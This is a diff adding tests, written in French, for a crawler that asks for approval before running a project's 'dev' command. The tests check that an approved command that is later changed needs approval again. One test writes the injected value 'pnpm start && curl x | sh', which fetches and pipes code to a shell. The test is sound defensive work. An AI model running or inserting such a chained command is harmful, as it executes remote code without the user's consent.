@@ -14,12 +14,29 @@
 
 import test from 'node:test'
 import assert from 'node:assert/strict'
-import { mkdtempSync } from 'node:fs'
+import { mkdtempSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { setTimeout as attendre } from 'node:timers/promises'
 
-import { decoupe, progression, crawlState, startCrawl, stopCrawl } from './crawl.js'
+import { accordRequis, decoupe, devSurDisque, progression, crawlState, startCrawl, stopCrawl } from './crawl.js'
+import { approuver } from '../crawl/confiance.js'
+
+/** Magasin de confiance jetable — jamais le profil réel de la machine. */
+function magasinNeuf() {
+  process.env.OVRSEE_TRUST = join(mkdtempSync(join(tmpdir(), 'ovrsee-trust-')), 'trust.json')
+}
+
+// Posé dès le chargement, et pas seulement dans les cas qui l'utilisent : le
+// crawler lancé plus bas hérite de l'environnement de cette suite.
+magasinNeuf()
+
+/** Un projet avec la commande `dev` donnée dans sa configuration. */
+function projetAvecDev(dev) {
+  const dir = mkdtempSync(join(tmpdir(), 'ovrsee-accord-'))
+  writeFileSync(join(dir, 'ovrsee.config.json'), JSON.stringify(dev === null ? {} : { dev }))
+  return dir
+}
 
 test('decoupe rend les lignes complètes et reporte le reste', () => {
   const premier = decoupe('', '[crawl] une\n[crawl] deu')
@@ -74,4 +91,54 @@ test('un crawl occupe son projet, puis le rend en finissant', async () => {
 
   // Arrêter ce qui n'existe plus est sans effet, pas une erreur.
   assert.deepEqual(stopCrawl(dir), { running: false, project: null, line: null })
+})
+
+// --- l'accord demandé avant le crawl --------------------------------------
+
+test('sans configuration lisible, aucun accord n’est requis', () => {
+  magasinNeuf()
+  const dir = mkdtempSync(join(tmpdir(), 'ovrsee-sans-config-'))
+
+  // Il n'y a rien à approuver : le crawl échouera faute de configuration, et
+  // c'est cet échec-là qui doit s'écrire, pas une question sans objet.
+  assert.equal(devSurDisque(dir), null)
+  assert.equal(accordRequis(dir), false)
+})
+
+test('une commande jamais vue demande l’accord', () => {
+  magasinNeuf()
+  const dir = projetAvecDev('pnpm start')
+
+  assert.equal(devSurDisque(dir), 'pnpm start')
+  assert.equal(accordRequis(dir), true)
+})
+
+test('une commande approuvée ne redemande rien', () => {
+  magasinNeuf()
+  const dir = projetAvecDev('pnpm start')
+
+  approuver(dir, 'pnpm start')
+
+  assert.equal(accordRequis(dir), false)
+})
+
+test('une commande modifiée depuis l’accord le redemande', () => {
+  magasinNeuf()
+  const dir = projetAvecDev('pnpm start')
+  approuver(dir, 'pnpm start')
+
+  writeFileSync(join(dir, 'ovrsee.config.json'), JSON.stringify({ dev: 'pnpm start && curl x | sh' }))
+
+  assert.equal(accordRequis(dir), true)
+})
+
+test('une configuration sans dev porte sur le même défaut que le crawler', () => {
+  magasinNeuf()
+  const dir = projetAvecDev(null)
+
+  // Deux défauts divergents feraient approuver une chaîne et en exécuter une
+  // autre : le crawl refuserait ensuite un projet qu'on vient d'autoriser.
+  assert.equal(devSurDisque(dir), 'pnpm dev')
+  approuver(dir, 'pnpm dev')
+  assert.equal(accordRequis(dir), false)
 })
